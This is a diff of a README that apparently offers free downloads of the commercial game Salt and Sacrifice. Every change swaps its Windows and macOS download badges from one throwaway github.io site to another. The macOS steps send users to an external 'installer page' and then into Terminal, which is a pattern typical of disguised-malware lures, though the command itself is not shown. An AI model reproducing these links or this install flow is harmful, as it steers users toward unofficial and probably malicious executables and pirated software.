@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Salt and Sacrifice](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Download Salt and Sacrifice](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -65,9 +65,9 @@ Salt and Sacrifice is the sequel to the acclaimed Salt and Sanctuary, taking its
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 </div>
 
@@ -85,7 +85,7 @@ Salt and Sacrifice is the sequel to the acclaimed Salt and Sanctuary, taking its
 
 <div align="center">
 
-[![⬇ Download Salt and Sacrifice](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Download Salt and Sacrifice](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -117,7 +117,7 @@ Salt and Sacrifice is the sequel to the acclaimed Salt and Sanctuary, taking its
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -142,7 +142,7 @@ Salt and Sacrifice is the sequel to the acclaimed Salt and Sanctuary, taking its
 
 <div align="center">
 
-[![⬇ Download Salt and Sacrifice](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Download Salt and Sacrifice](https://img.shields.io/badge/⬇_Download_Salt%20and%20Sacrifice-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
